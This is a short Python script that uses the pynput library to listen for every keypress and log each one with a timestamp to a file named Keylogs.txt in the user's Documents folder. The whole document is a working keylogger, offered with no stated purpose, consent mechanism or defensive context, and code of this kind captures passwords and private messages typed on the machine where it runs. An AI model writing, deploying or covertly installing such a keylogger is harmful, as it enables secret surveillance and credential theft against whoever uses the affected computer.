from pynput.keyboard import Key, Listener
import logging
import os

log_dir = os.path.expanduser("~/Documents/")  # Change path if needed

logging.basicConfig(filename=os.path.join(log_dir, "Keylogs.txt"),
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error logging key: {e}")

with Listener(on_press=on_press) as listener:
    listener.join()
